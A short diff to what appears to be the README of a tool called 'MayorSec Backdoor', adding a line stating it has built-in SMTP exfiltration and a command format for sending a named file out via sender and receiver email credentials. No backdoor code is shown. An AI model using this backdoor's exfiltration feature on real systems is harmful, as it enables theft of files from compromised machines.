@@ -18,6 +18,9 @@ This will execute the command.  Note that some Powershell functionality may cras
 
 ## SMTP Exfiltration
 ![SMTPExfil](/images/smtpexfil.png)
+
+MayorSec Backdoor has built in exfiltration functionality via SMTP.  Use the below format from the command line.
+
 ```exfiltrate filename <sender_email> <sender_email_password> <receiver_email>```
 
 ## Compilation
